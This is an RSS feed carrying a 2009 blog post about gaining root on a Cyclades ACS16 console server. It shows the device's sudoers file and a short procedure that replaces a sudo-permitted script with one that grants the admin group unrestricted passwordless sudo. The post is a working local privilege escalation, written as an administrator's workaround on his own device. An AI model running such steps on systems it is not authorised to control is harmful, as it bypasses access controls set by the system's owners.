<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Jason Antman's Blog</title><link>http://blog.jasonantman.com/</link><description></description><atom:link href="http://blog.jasonantman.com/feeds/tags/gettingroot.rss.xml" rel="self"></atom:link><lastBuildDate>Wed, 18 Nov 2009 16:21:00 -0500</lastBuildDate><item><title>root on a Cyclades ACS consoleÂ server</title><link>http://blog.jasonantman.com/2009/11/root-on-a-cyclades-acs-console-server/</link><description>&lt;p&gt;At work we have a Cyclades &lt;span class="caps"&gt;ACS16&lt;/span&gt; console server (running
Cyclades-&lt;span class="caps"&gt;ACS16&lt;/span&gt;-Linux V_3.2.0 (Jan/04/08)). While the docs claim all
sorts of &lt;span class="caps"&gt;LDAP&lt;/span&gt; features, there&amp;#8217;s nothing (either in the web &lt;span class="caps"&gt;GUI&lt;/span&gt; or the
&lt;span class="caps"&gt;CLI&lt;/span&gt; configuration tool) to setup &lt;span class="caps"&gt;LDAP&lt;/span&gt; with &lt;span class="caps"&gt;TLS&lt;/span&gt; or required group
membership. I tried modifying the /etc/ldap.conf and /etc/nsswitch.conf
files, running &lt;code&gt;saveconf&lt;/code&gt; and &lt;code&gt;runconf&lt;/code&gt; and even rebooting, but no luck.
It was apparent that I needed root on the box. Unfortunately, they don&amp;#8217;t
give you root, and their sudo command is locked down. But, I figured, if
sudo would let me &lt;/code&gt; and &lt;code&gt;chown&lt;/code&gt; and &lt;code&gt;cat&lt;/code&gt; and &lt;code&gt;mv&lt;/code&gt; (enough to
switch out the ldap.conf and nsswitch.conf files), root should be pretty&amp;nbsp;easy.&lt;/p&gt;
&lt;p&gt;The failing of Cyclades&amp;#8217; sudo lockdown is that it allows sudo execution
of a few random shell scripts, and also allows&amp;nbsp;`mv`.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;/etc/sudoers&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;# sudoers file.
#
# This file MUST be edited with the &amp;#39;visudo&amp;#39; command as root.
#
# See the sudoers man page for the details on how to write a sudoers file.
#

# User alias specification

# Runas alias specification

# Host alias specification

# Cmnd alias specification
Cmnd_Alias     SH_CMDS = /bin/cp,  
                        /bin/chown,  
                        /bin/egrep,  
                        /bin/grep,  
                        /bin/cat,  
                        /bin/tar,  
                        /bin/kill,  
                        /bin/mkdir,  
                        /bin/mv,  
                        /bin/rm,  
                        /bin/sed,  
                        /bin/touch,  
                        /sbin/reboot,  
                        /usr/bin/killall,  
                        /usr/bin/w,  
                        /bin/w_cas,  
                        /bin/sess_mngt,  
                        /sbin/route,  
                        /bin/what

Cmnd_Alias     CONF_FILES = /bin/vi /etc/network/st_routes,  
                           /bin/vi /etc/portslave/pslave.conf,  
                           /bin/vi /etc/resolv.conf

Cmnd_Alias     APPLICATIONS = /bin/pmCommand,  
                             /bin/saveconf,  
                             /bin/restoreconf,  
                             /bin/runconf,  
                             /bin/daemon.sh,  
                             /bin/manageService.sh,  
                             /bin/dsviewKillAdmin,   
                             /bin/pmfwupgrade,   
                             /bin/adsap2_clear,   
                             /bin/upgrade_power.sh,   
                             /bin/signal_ras

# User privilege specification
# root can run any command on any host as any user.
root    ALL = (ALL) ALL

# admin user group command specification.
%admin      ALL = NOPASSWD: SH_CMDS, CONF_FILES, APPLICATIONS
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, /bin/upgrade_power.sh doesn&amp;#8217;t look like we&amp;#8217;re using it too much.
Here&amp;#8217;s our root procedure. Before doing this, create the
&lt;code&gt;/home/admin/foo.sh&lt;/code&gt; script.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;sudo cp /bin/upgrade_power.sh /bin/upgrade_power.sh.SAVE
sudo chown root:root /home/admin/foo.sh
sudo mv /home/admin/foo.sh /bin/upgrade_power.sh
sudo /bin/upgrade_power.sh
sudo cat /etc/sudoers &lt;span class="c"&gt;# just to verify that it worked&lt;/span&gt;
sudo mv /bin/upgrade_power.sh.&lt;span class="caps"&gt;SAVE&lt;/span&gt; /bin/upgrade_power.sh &lt;span class="c"&gt;# set things back to the way they were&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And the key to all of it is the simple &lt;code&gt;/home/admin/foo.sh&lt;/code&gt; script:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;

chmod u+w /etc/sudoers
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;%admin      &lt;span class="caps"&gt;ALL&lt;/span&gt; = &lt;span class="caps"&gt;NOPASSWD&lt;/span&gt;: &lt;span class="caps"&gt;ALL&lt;/span&gt;&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/sudoers
chmod u-w /etc/sudoers
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That&amp;#8217;s&amp;nbsp;it!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Wed, 18 Nov 2009 16:21:00 -0500</pubDate><guid>tag:blog.jasonantman.com,2009-11-18:2009/11/root-on-a-cyclades-acs-console-server/</guid><category>acs</category><category>cyclades</category><category>gettingroot</category></item></channel></rss>